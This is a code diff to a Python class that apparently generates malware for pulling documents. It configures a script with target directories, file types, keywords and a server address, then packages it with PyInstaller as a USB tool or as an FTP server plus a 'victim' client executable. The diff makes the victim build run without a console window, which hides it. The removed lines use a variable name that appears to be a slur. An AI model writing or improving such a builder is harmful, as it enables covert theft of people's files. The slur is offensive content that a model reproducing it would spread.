@@ -19,11 +19,11 @@ class DocPullerGenerator:
         self.DOCPULLER_FTP_CLIENT_PATH = 'Generator/victimscrip.py'
 
         # Specify additional PyInstaller options if needed
-        self.options = [
+        self.command = [
+            "pyinstaller",
             "--onefile",
             "--noconsole",
-            f"--distpath={self.save_dir}",
-            f'--add-data /DocPullerScripts'
+            f"--distpath={self.save_dir}"
         ]
 
         ScriptGen(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).write_to_file()
@@ -32,27 +32,25 @@ class DocPullerGenerator:
         if self.is_usb:
             print('genarating exe')
 
-            command = ["pyinstaller", '--console', '--onefile', f"--distpath={self.save_dir}", self.DOCPULLER_USB_PATH]
-            nig = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                   universal_newlines=True)
-            nig.communicate()
+            command = self.command + [self.DOCPULLER_USB_PATH]
+            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                       universal_newlines=True)
+            execute.communicate()
             print('done!')
 
         else:
             print('genarating server exe')
 
-            command = ["pyinstaller", '--console', '--onefile', f"--distpath={self.save_dir}",
-                       self.DOCPULLER_FTP_SERVER_PATH]
-            nig = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                   universal_newlines=True)
-            nig.communicate()
+            command = self.command + [self.DOCPULLER_FTP_SERVER_PATH]
+            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                       universal_newlines=True)
+            execute.communicate()
 
             print('genarating victim exe')
 
-            command = ["pyinstaller", '--console', '--onefile', f"--distpath={self.save_dir}",
-                       self.DOCPULLER_FTP_CLIENT_PATH]
-            nig = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                   universal_newlines=True)
-            nig.communicate()
+            command = self.command + [self.DOCPULLER_FTP_CLIENT_PATH]
+            execute = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                       universal_newlines=True)
+            execute.communicate()
 
             print('Done!')
